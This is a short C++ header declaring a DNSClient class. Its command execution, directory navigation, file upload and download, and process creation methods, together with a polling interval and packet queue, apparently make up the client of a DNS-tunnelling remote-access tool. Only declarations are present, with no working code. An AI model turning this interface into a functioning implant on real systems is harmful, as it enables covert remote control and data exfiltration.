#ifndef __DNSCLIENT_H__
#define __DNSCLIENT_H__

#include <deque>
#include <string>
#include <vector>
#include "Packet.h"
using namespace std;

class DNSClient
{
public:
	DNSClient();

	int main();
	void sync();
	void pack_outbound_queue(unsigned char, string);
	string exec(const string&);
	string get_current_dir();
	string change_dir(const string&);
	void write_file(const string&);
	string fetch_file(const string&);
	string create_process(const string&);

private:
	unsigned int client_id;
	string domain;
	string packet_id;
	unsigned int interval;
	deque<Packet> outbound_queue;
	vector<Packet> packet_buffer;
};

#endif
